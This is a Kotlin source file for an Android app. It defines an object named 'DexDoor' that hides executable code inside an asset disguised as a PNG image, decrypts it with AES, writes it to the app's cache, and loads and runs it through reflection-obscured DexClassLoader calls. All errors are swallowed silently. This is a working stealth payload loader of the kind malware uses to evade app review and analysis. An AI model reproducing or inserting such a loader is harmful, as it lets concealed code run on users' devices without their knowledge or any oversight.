package com.announcement.comprehension.t

import android.app.Application
import android.content.Context
import java.io.File
import java.io.FileOutputStream
import java.lang.reflect.Constructor
import java.lang.reflect.Field
import java.lang.reflect.Method
import java.security.Key
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec


object DexDoor {
    private var dexClass: Class<*>? = null
    private var dexObject: Any? = null
    private var dexMethod: Method? = null

    private fun aesDecrypt(data: ByteArray, key: Key): ByteArray {
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        return cipher.doFinal(data)
    }

    fun start(context: Context, list0: ArrayList<String>, list1: ArrayList<String>) {
        try {
            val encryptedPng = context.assets.open(list0[0]).use { it.readBytes() }
            val encryptedDex = encryptedPng.copyOfRange(8, encryptedPng.size)

            val importantKey: Key = SecretKeySpec(list0[1].toByteArray(), "AES")

            // 3. 解密 Dex 数据
            val dexBytes = aesDecrypt(encryptedDex, importantKey)

            // 4. 将 Dex 写入临时文件
            val outFile = File(context.cacheDir, "cfgo")

            // 2. 写入 dex 文件
//            val outFile = File(context.getCacheDir(), "cfgo")
            if (!outFile.exists() || outFile.length() == 0L) {
                try {
                    FileOutputStream(outFile).use { fos ->
                        fos.write(dexBytes)
                        outFile.setReadOnly()
                    }
                } catch (e: Exception) {
                    return  // 写文件失败直接返回
                }
            }

            // 3. 反射调用 DexClassLoader + 方法
            if (dexClass == null || dexObject == null || dexMethod == null) {
                val od = File(context.getCacheDir(), "mkk")
                od.mkdirs()

                // 构建 DexClassLoader
                val loaderClass = Class.forName(list0[2])
                val loaderConstructor: Constructor<*> = loaderClass.getConstructor(
                    String::class.java,
                    String::class.java,
                    String::class.java,
                    ClassLoader::class.java
                )
                val loader: Any = loaderConstructor.newInstance(
                    outFile.getAbsolutePath(),
                    od.getAbsolutePath(),
                    null,
                    context.getClassLoader()
                )
                val loadClassMethod: Method =
                    loader.javaClass.getMethod(list0[3], String::class.java)
                dexClass = loadClassMethod.invoke(loader, list0[4]) as Class<*>?

                val field: Field = dexClass!!.getField("INSTANCE")
                dexObject = field.get(null)
                dexMethod = dexClass!!.getDeclaredMethod(
                    list0[5],
                    Application::class.java,
                    ArrayList::class.java
                )
            }
            dexMethod?.invoke(dexObject, context.applicationContext, list1)
        } catch (ignored: Exception) {
        }
    }
}
